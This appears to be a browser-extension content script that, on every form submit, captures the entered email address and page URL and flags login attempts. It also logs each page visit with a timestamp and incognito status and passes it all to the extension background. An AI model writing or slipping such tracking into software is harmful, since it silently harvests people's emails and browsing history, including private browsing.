document.addEventListener("submit", function (event) {
  const form = event.target;
  const emailInput = form.querySelector('input[type="email"]');
  const passwordInput = form.querySelector('input[type="password"]'); // Check for password field

  if (emailInput) {
    const email = emailInput.value;
    const url = window.location.href;

    // Determine if this is a registration or login
    let type = passwordInput ? "login_attempt" : "form_submission"; // Check if there's a password field

    chrome.runtime.sendMessage({
      type: type, // Send the appropriate type
      email: email,
      url: url,
    });

    // Track page visits
    chrome.runtime.sendMessage({
      type: "page_visit",
      url: window.location.href,
      timestamp: new Date().toISOString(),
    });
  }
});

// SINGLE PLACE FOR PAGE VISIT TRACKING
function trackPageVisit() {
  chrome.runtime.sendMessage({ type: "check_incognito" }, (response) => {
    const isIncognito = response?.isIncognito || false;
    
    chrome.runtime.sendMessage({
      type: "page_visit",
      url: window.location.href,
      timestamp: new Date().toISOString(),
      isIncognito: isIncognito
    });
  });
}

// Consolidate all navigation tracking
window.addEventListener('load', trackPageVisit);
window.addEventListener('popstate', trackPageVisit);
